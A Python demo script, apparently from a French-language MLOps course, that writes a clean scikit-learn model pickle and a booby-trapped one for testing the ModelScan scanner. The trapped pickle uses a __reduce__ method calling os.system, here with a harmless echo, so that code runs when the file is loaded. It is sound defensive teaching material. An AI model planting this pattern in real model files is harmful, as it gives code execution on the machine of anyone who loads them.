"""Étape 7.2 — fabrique deux pickles pour la démo ModelScan. NE PAS LES CHARGER.

- model.pkl     : le modèle sérialisé avec pickle ;
- malicious.pkl : le même modèle + une charge cachée (simple `echo`, inoffensive).

Usage (racine du repo) : uv run python packaging/scan-demo/make_pickles.py
"""

import os
import pickle
from pathlib import Path

import mlflow

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]

# Modèle téléchargé manuellement dans /tmp/champion (contournement du téléchargement MLflow)
model = mlflow.sklearn.load_model("/tmp/champion")


class Payload:
    """__reduce__ dit à pickle comment « reconstruire » l'objet : ici, appeler os.system."""

    def __reduce__(self):
        return (os.system, ("echo '[pickle piégé] ce code vient de s exécuter'",))


with open(HERE / "model.pkl", "wb") as f:
    pickle.dump(model, f)
with open(HERE / "malicious.pkl", "wb") as f:
    pickle.dump({"model": model, "metadata": Payload()}, f)
print(f"Written: {HERE.relative_to(ROOT)}/model.pkl, {HERE.relative_to(ROOT)}/malicious.pkl")
